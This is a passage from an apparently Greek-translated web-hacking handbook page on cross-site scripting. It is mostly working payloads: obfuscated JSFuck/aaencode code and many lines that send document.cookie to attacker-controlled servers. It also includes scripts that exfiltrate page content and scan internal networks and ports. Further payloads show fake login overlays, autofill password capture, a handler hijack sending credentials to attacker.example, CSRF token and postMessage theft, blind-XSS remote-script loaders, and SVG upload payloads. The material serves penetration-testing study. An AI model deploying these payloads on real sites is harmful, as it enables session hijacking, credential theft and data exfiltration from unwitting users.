[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
```

```javascript
//aaencode
ﾟωﾟﾉ = /｀ｍ´）ﾉ ~┻━┻   / /*´∇｀*/["_"]
o = ﾟｰﾟ = _ = 3
c = ﾟΘﾟ = ﾟｰﾟ - ﾟｰﾟ
ﾟДﾟ = ﾟΘﾟ = (o ^ _ ^ o) / (o ^ _ ^ o)
ﾟДﾟ = {
ﾟΘﾟ: "_",
ﾟωﾟﾉ: ((ﾟωﾟﾉ == 3) + "_")[ﾟΘﾟ],
ﾟｰﾟﾉ: (ﾟωﾟﾉ + "_")[o ^ _ ^ (o - ﾟΘﾟ)],
ﾟДﾟﾉ: ((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ],
}
ﾟДﾟ[ﾟΘﾟ] = ((ﾟωﾟﾉ == 3) + "_")[c ^ _ ^ o]
ﾟДﾟ["c"] = (ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ - ﾟΘﾟ]
ﾟДﾟ["o"] = (ﾟДﾟ + "_")[ﾟΘﾟ]
ﾟoﾟ =
ﾟДﾟ["c"] +
ﾟДﾟ["o"] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ] +
((ﾟωﾟﾉ == 3) + "_")[ﾟｰﾟ] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ - ﾟΘﾟ] +
ﾟДﾟ["c"] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
ﾟДﾟ["o"] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ]
ﾟДﾟ["_"] = (o ^ _ ^ o)[ﾟoﾟ][ﾟoﾟ]
ﾟεﾟ =
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
ﾟДﾟ.ﾟДﾟﾉ +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[o ^ _ ^ (o - ﾟΘﾟ)] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ]
ﾟｰﾟ += ﾟΘﾟ
ﾟДﾟ[ﾟεﾟ] = "\\"
ﾟДﾟ.ﾟΘﾟﾉ = (ﾟДﾟ + ﾟｰﾟ)[o ^ _ ^ (o - ﾟΘﾟ)]
oﾟｰﾟo = (ﾟωﾟﾉ + "_")[c ^ _ ^ o]
ﾟДﾟ[ﾟoﾟ] = '"'
ﾟДﾟ["_"](
ﾟДﾟ["_"](
ﾟεﾟ +
ﾟДﾟ[ﾟoﾟ] +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
(ﾟｰﾟ + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟoﾟ]
)(ﾟΘﾟ)
)("_")
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS συνηθισμένα payloads

### Πολλαπλά payloads σε 1


{{#ref}}
steal-info-js.md
{{#endref}}

### Iframe Trap

Κάντε τον χρήστη να πλοηγηθεί στη σελίδα χωρίς να βγει από το iframe και να κλέψετε τις ενέργειές του (συμπεριλαμβανομένων των πληροφοριών που αποστέλλονται σε φόρμες):


{{#ref}}
../iframe-traps.md
{{#endref}}

### Ανάκτηση Cookies
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
> [!TIP]
> **Δεν θα μπορείτε να αποκτήσετε πρόσβαση στα cookies από JavaScript** εάν η σημαία HTTPOnly έχει οριστεί στο cookie. Αλλά εδώ έχετε [some ways to bypass this protection](../hacking-with-cookies/index.html#httponly) αν είστε αρκετά τυχεροί.

### Κλοπή περιεχομένου της σελίδας
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
var attacker = "http://10.10.14.8/exfil"
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open("GET", url, true)
xhr.send(null)
```
### Εύρεση internal IPs
```html
<script>
var q = []
var collaboratorURL =
"http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net"
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for (i = 1; i <= 255; i++) {
q.push(
(function (url) {
return function () {
fetchUrl(url, wait)
}
})("http://192.168.0." + i + ":8080")
)
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for (i = 1; i <= n_threads; i++) {
if (q.length) q.shift()()
}

function fetchUrl(url, wait) {
console.log(url)
var controller = new AbortController(),
signal = controller.signal
fetch(url, { signal })
.then((r) =>
r.text().then((text) => {
location =
collaboratorURL +
"?ip=" +
url.replace(/^http:\/\//, "") +
"&code=" +
encodeURIComponent(text) +
"&" +
Date.now()
})
)
.catch((e) => {
if (!String(e).includes("The user aborted a request") && q.length) {
q.shift()()
}
})

setTimeout((x) => {
controller.abort()
if (q.length) {
q.shift()()
}
}, wait)
}
</script>
```
### Port Scanner (fetch)
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Port Scanner (websockets)
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_Σύντομοι χρόνοι δείχνουν ότι το port ανταποκρίνεται_ _Μεγαλύτεροι χρόνοι δείχνουν ότι δεν υπάρχει απάντηση._

Ελέγξτε τη λίστα των ports που απαγορεύονται στο Chrome [**here**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net_util.cc) και στο Firefox [**here**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist).

### Πλαίσιο για αίτηση credentials
```html
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### Καταγραφή αυτόματης συμπλήρωσης κωδικών
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
Όταν οποιαδήποτε δεδομένα εισαχθούν στο password field, το username και το password αποστέλλονται στον attackers server — ακόμα και αν ο client επιλέξει ένα saved password και δεν γράψει τίποτα, τα credentials θα είναι ex-filtrated.

### Hijack form handlers to exfiltrate credentials (const shadowing)

If a critical handler (e.g., `function DoLogin(){...}`) is declared later in the page, and your payload runs earlier (e.g., via an inline JS-in-JS sink), define a `const` with the same name first to preempt and lock the handler. Later function declarations cannot rebind a `const` name, leaving your hook in control:
```javascript
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value);
const user = Trim(FormInput.InputUtente.value);
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
};
```
Σημειώσεις
- Αυτό βασίζεται στη σειρά εκτέλεσης: η injection σας πρέπει να εκτελεστεί πριν από τη νόμιμη δήλωση.
- Αν το payload σας είναι τυλιγμένο σε `eval(...)`, οι δεσμεύσεις `const/let` δεν θα γίνουν global. Χρησιμοποιήστε την dynamic `<script>` injection τεχνική από την ενότητα “Deliverable payloads with eval(atob()) and scope nuances” για να εξασφαλίσετε μια πραγματική global, μη-επαναδεσμεύσιμη δέσμευση.
- Όταν φίλτρα λέξεων-κλειδιών μπλοκάρουν κώδικα, συνδυάστε με Unicode-escaped identifiers ή παράδοση `eval(atob('...'))`, όπως φαίνεται παραπάνω.

### Keylogger

Απλώς ψάχνοντας στο github βρήκα μερικά διαφορετικά:

- [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
- [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
- [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
- Μπορείτε επίσης να χρησιμοποιήσετε το metasploit `http_javascript_keylogger`

### Stealing CSRF tokens
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### Κλοπή μηνυμάτων PostMessage
```html
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### Κατάχρηση Service Workers


{{#ref}}
abusing-service-workers.md
{{#endref}}

### Πρόσβαση στο Shadow DOM


{{#ref}}
shadow-dom.md
{{#endref}}

### Polyglots


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
{{#endref}}

### Blind XSS payloads

Μπορείτε επίσης να χρησιμοποιήσετε: [https://xsshunter.com/](https://xsshunter.com)
```html
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<!-- Payloads from https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide -->
<!-- Image tag -->
'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- Input tag with autofocus -->
'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- In case jQuery is loaded, we can make use of the getScript method -->
'"><script>$.getScript("{SERVER}/script.js")</script>

<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))

<!-- Render an iframe to validate your injection point and receive a callback -->
'"><iframe src="{SERVER}"></iframe>

<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />

<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />

<!-- In case your target makes use of AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```
### Regex - Πρόσβαση σε Κρυφό Περιεχόμενο

Από [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay) μπορεί κανείς να μάθει ότι, ακόμη κι αν κάποιες τιμές εξαφανιστούν από το JS, εξακολουθεί να είναι δυνατό να τις βρει κανείς σε JS attributes μέσα σε διαφορετικά objects. Για παράδειγμα, ένα input ενός REGEX εξακολουθεί να μπορεί να εντοπιστεί ακόμη και μετά την αφαίρεση της τιμής του input του regex:
```javascript
// Do regex with flag
flag = "CTF{FLAG}"
re = /./g
re.test(flag)

// Remove flag value, nobody will be able to get it, right?
flag = ""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
)
```
### Brute-Force List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt
{{#endref}}

## XSS Κατάχρηση άλλων ευπαθειών

### XSS στο Markdown

Μπορείς να εισάγεις κώδικα Markdown που θα αποδοθεί; Ίσως έτσι να προκύψει XSS! Έλεγξε:


{{#ref}}
xss-in-markdown.md
{{#endref}}

### XSS σε SSRF

Βρήκες XSS σε έναν **ιστότοπο που χρησιμοποιεί caching**; Δοκίμασε να **το αναβαθμίσεις σε SSRF** μέσω Edge Side Include Injection με αυτό το payload:
```python
<esi:include src="http://yoursite.com/capture" />
```
Χρησιμοποίησέ το για να παρακάμψεις περιορισμούς cookie, XSS φίλτρα και πολλά ακόμα!\
Περισσότερες πληροφορίες για αυτήν την τεχνική εδώ: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### XSS σε δυναμικά δημιουργημένο PDF

Αν μια ιστοσελίδα δημιουργεί ένα PDF χρησιμοποιώντας δεδομένα που ελέγχονται από τον χρήστη, μπορείς να προσπαθήσεις να **ξεγελάσεις το bot** που δημιουργεί το PDF ώστε να **εκτελέσει αυθαίρετο JS κώδικα**.\
Έτσι, αν το **PDF creator bot εντοπίσει** κάποιο είδος **HTML tags**, θα τα **ερμηνεύσει**, και μπορείς να **κακοχρησιμοποιήσεις** αυτή τη συμπεριφορά για να προκαλέσεις **Server XSS**.


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}

Αν δεν μπορείς να εισάγεις HTML tags, μπορεί να αξίζει να δοκιμάσεις να **inject PDF data**:


{{#ref}}
pdf-injection.md
{{#endref}}

### XSS in Amp4Email

Το AMP, που στοχεύει στην επιτάχυνση της απόδοσης ιστοσελίδων σε κινητές συσκευές, ενσωματώνει HTML tags συμπληρωμένα με JavaScript για να εξασφαλίσει λειτουργικότητα με έμφαση στην ταχύτητα και την ασφάλεια. Υποστηρίζει μια σειρά από components για διάφορες λειτουργίες, προσβάσιμα μέσω [AMP components](https://amp.dev/documentation/components/?format=websites).

Η [**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) μορφή επεκτείνει συγκεκριμένα AMP components στα email, επιτρέποντας στους παραλήπτες να αλληλεπιδρούν με το περιεχόμενο απευθείας μέσα στα email τους.

Παράδειγμα [**writeup XSS in Amp4Email in Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### XSS uploading files (svg)

Ανέβασε ως εικόνα ένα αρχείο σαν το παρακάτω (από [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)):
```html
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x" /></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
Βρείτε **περισσότερα SVG payloads στο** [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

## Διάφορα JS κόλπα & Σχετικές Πληροφορίες


{{#ref}}
other-js-tricks.md
{{#endref}}

## Πόροι XSS

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
- [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
- [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
- [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
- [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

## Αναφορές

- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [MDN eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)

{{#include ../../banners/hacktricks-training.md}}
